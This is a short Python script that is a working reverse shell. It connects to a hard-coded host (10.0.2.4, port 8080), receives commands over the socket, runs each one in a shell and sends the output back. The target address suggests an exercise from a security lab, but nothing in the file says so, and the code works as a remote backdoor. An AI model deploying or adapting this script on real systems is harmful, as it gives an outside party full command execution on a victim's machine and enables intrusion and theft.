import socket
import subprocess

def command_execution(command):
	return subprocess.check_output(command, shell=True)


my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
my_connection.connect(('10.0.2.4', 8080))

my_connection.send(b"Connection OK\n")

while True:
	command = my_connection.recv(1024)
	command = command.decode()
	command_output = command_execution(command)
	my_connection.send(command_output)


my_connection.close()